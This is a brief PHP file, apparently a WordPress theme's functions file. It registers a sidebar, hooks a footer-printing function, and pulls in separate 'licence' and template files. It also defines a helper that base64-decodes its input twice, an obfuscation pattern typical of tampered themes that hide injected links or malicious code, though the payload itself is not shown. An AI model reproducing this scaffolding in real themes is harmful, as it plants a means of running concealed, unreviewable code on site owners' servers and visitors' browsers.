<?php
require_once("theme_licence.php"); add_action('wp_footer','print_footer');
if ( function_exists('register_sidebars') )
    register_sidebars(1);
function decode_it($code) { return base64_decode(base64_decode($code)); } require_once(pathinfo(__FILE__,PATHINFO_DIRNAME)."/start_template.php");
?>